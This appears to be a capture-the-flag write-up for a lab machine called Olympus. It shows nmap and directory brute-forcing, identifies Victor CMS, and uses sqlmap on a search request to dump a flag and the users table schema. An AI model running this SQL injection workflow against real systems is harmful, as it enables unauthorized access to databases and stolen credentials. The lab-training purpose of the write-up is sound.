# Target Overview
<img width="1920" height="936" alt="Screenshot_2025-09-10_21-43-47" src="https://github.com/user-attachments/assets/6374ee48-1e99-4825-b2bd-4fe73501de28" />
A notification about the ongoing development of the site .

## Recon
Kick off the enumeration phase by `nmap` .
```
nmap -O -A -T5 -vv -sV olympus.thm
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e4:d5:a9:25:02:d3:ae:55:a6:8e:0b:7c:d6:c0:a7:e1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7EbPZ7ANEkwR3rnMc+hfqgExTn+DMJIk6D8rYIkBJyM8aJKAPPo4EnoU5qzJFigVYKHhKju64pLwAgMRgYWPiPgDjb3xGjTLxkLdEj30mNFpCd8xwdBQImMxSk3QJ+BgIjRFuOTNavKHR1TXLxBqj/h/lSWncMv4KXXsM+pT1OJtEru3KtdK04k0byEZD+zaPv+fsC92JSb+GDGcjk1Mw32u1KHuXylwmK7y5JpXZeNVUniZSZX9YUa4P4ukeEyXVYgYDWJTfBOyQz5WSgcBUms6C2Gc/yOUeoX3QPma/MceHVUf5MLcDEsCYDVwuUa1IM72vlGM8zKZfBkpae6jic+E2EsdNqdPg93+0Wye+6ca/fqx3vxLoY+k1sUWYqW8i5gL00KPnC8GxM0XImeNZwgpoeSl3aHpDfpYPXfEHoiYhBdjOFYn7Nxt80s6CpCr18SMqoITrxzcRbPpFb5bzCDsjupRV1+iU2pF3uybyU9aSF2uVhZBpDlwerCvOViU=
|   256 92:01:21:cb:fd:ff:72:6d:5f:39:4f:d0:5d:16:47:02 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKjFPThitZkVg3TbERDRVYXifb8wHtI4KHtmkodCfdVT9ikSj1K6Ii0rBgzrtAhdG2hUKNOa5wIlasfHFZOtVm4=
|   256 86:4d:2c:45:08:e4:2a:d0:1b:3f:f9:c9:d1:a7:51:85 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPr5Ou5oqHnQbhChAeePdOQz5exDZGxbUASidVS18J6k
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: ED726E098473BFA7523153F761D2232F
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Olympus
...
```
Command Explaination:

`-O` for OS dectecting system, do not misstype it with `-o` which is used for output.

`-A` is aggressive mode for OS detection including OS version.

`-vv` for more information.

`-sV` determine the service info.

Attempting to access port 80 giving me 2 scenarios:
- If I haven't added the target IP along with its domain name which means that I can't access it
- Otherwise, here is it!!!
<img width="1920" height="936" alt="Screenshot_2025-09-10_21-43-47" src="https://github.com/user-attachments/assets/6374ee48-1e99-4825-b2bd-4fe73501de28" />
This may have some hidden directories so I tried to brute force it using `gobuster` .
```
gobuster dir -u "http://10.201.112.33/" -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64
...
/javascript           (Status: 301) [Size: 319] [--> http://10.201.112.33/javascript/]                                                                    
/phpmyadmin           (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
...
```
Command Explaination:

`dir` specifies using to enumerate directory.

`-u` indicates the target.

`-w` using that wordlist.

`-t` threads making `gobuster` run faster.

This wordlist only gave useless files which confused me a while.
I need to change to another wordlists.
```
gobuster dir -u "http://10.201.112.33/" -w /usr/share/wordlists/dirb/big.txt -t 164 2>/dev/null
...
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/javascript           (Status: 301) [Size: 319] [--> http://10.201.112.33/javascript/]                                                                    
/phpmyadmin           (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
...
```
And it still doesn't show me anything useful frankly. At this point I am a bit annoyed, so I switch to `ffuf`.
```
fuf -u http://olympus.thm/FUZZ -w /usr/share/wordlists/dirb/big.txt -c
...
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 401ms]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 2547ms]
~webmaster              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 407ms]
static                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 412ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 511ms]
phpmyadmin              [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 410ms]
javascript              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 407ms]
...
```
Even though there are some directories similar to the output of `gobuster` and they use the same wordlists, for some reasons `gobuster` produced wosre response than `ffuf`.Therefore, I learn that `ffuf` definitely beat `gobuster` at this race.
Two directories catch my attention are `~webmaster` and `static`, so I need to access them.
<img width="1920" height="513" alt="Screenshot_2025-09-10_22-42-37" src="https://github.com/user-attachments/assets/3814c874-c2a5-48b9-9b92-a36a0e352b7f" />
<img width="1920" height="1000" alt="Screenshot_2025-09-10_22-42-55" src="https://github.com/user-attachments/assets/1b5a560c-f659-42e4-aed9-3227fd90ddbd" />
Waoo, so `~webmaster` is actually so interesting. This directory indicates that it uses `Victor CMS`  so it is advisable to look for CVE related to this CMS ( I literally forgot to look for the version first).
I end up with this one .
<img width="1920" height="934" alt="Screenshot_2025-09-10_22-47-13" src="https://github.com/user-attachments/assets/bdc8bf8f-f5df-4bef-8d20-27373ae8b3c9" />
I assume that this CMS is vulnerable to the CVE provided above. Furthermore I can navigate to the login section which is the sexiest field I need to find in order to execute SQL injection.
But first I want to brute-force the credentials first!!! I use `john` to execute this task. However, I have to intercept the respone in order to craft the `http-post-form` for `john` to brute-force credentials
<img width="1600" height="899" alt="Screenshot_2025-09-10_22-53-18" src="https://github.com/user-attachments/assets/f3a43c0b-09d8-4d4e-90b4-593cc51ac4cd" />
<img width="610" height="337" alt="Screenshot_2025-09-10_22-55-54" src="https://github.com/user-attachments/assets/210e13fb-3d88-4441-85a9-a0b5d1a5c553" />
In order to craft `http-post-form`, this is the format "path:input_for_login:error" .In this case, it is "/~webmaster/includes/login.php:user_name=admin&user_password=1234&login=:.."
Unexpectedly, I can manually brute-force the login section let alone automatically execute it because of the sevice's redirecting to blank page.
Luckily, the search bar function normally so I guess it is time to execute SQLi to extract information.
First, inserting the intercepted POST response to `request.txt`.
Then using this command to check whether my assumption is right or not about SQLi in this service.
``` 
sqlmap -r request.txt

[23:08:03] [INFO] the back-end DBMS is MySQL

```
Command Explaination:

`-r` for speciying request

Therefore, I need to list the database
```
sqlmap -r request.txt --dbs
...
[*] information_schema
[*] mysql
[*] olympus
[*] performance_schema
[*] phpmyadmin
[*] sys

```
Command Explaination:

`--dbs` for listing database

Next, I want to extract table names of olympus database  for further enumerating 
```
sqlmap -r request.txt -D olympus --tables
...
Database: olympus
[6 tables]
+------------+
| categories |
| chats      |
| chmments   |
| flag       |
| fosts      |
| users      |
+------------+

...
```
Command Explaination:

`-D` specifies the database that I used

`--tables` for listing the table names of that database

Maybe I can get the flag only accessing the flag table 
```
sqlmap -r request.txt -D olympus -T flag --columns
...
Database: olympus
Table: flag
[1 column]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| flag   | varchar(255) |

...

```
Command Explaination:

`-T` for specifying the table

`--columns` for listing each columns inside that table

Now, I know that this table only has one column called `flag` then I further access to the row to get the value of the `flag`
```
sqlmap -r request.txt -D olympus -T flag -C flag --dump
...
Database: olympus
Table: flag
[1 entry]
+---------------------------+
| flag                      |
+---------------------------+
| flag{Sm4rt!_k33P_d1gGIng} |
+---------------------------+
...
```
Command Explaination:

`-C` specifies the column name

`--dump` for listing table data

This is the first flag, I need to get the credentials of olympus service which means that I have to list the data of the user inside `users` table
```
sqlmap -r request.txt -D olympus -T users --columns
...

Database: olympus
Table: users
[9 columns]
+----------------+--------------+
| Column         | Type         |
+----------------+--------------+
| randsalt       | varchar(255) |
| user_email     | varchar(255) |
| user_firstname | varchar(255) |
| user_id        | int          |
| user_image     | text         |
| user_lastname  | varchar(255) |
| user_name      | varchar(255) |
| user_password  | varchar(255) |
| user_role      | varchar(255) |
+----------------+--------------+

...
```
# Reference
[SQLmap](https://www.vaadata.com/blog/sqlmap-the-tool-for-detecting-and-exploiting-sql-injections/#listing-the-table-names)
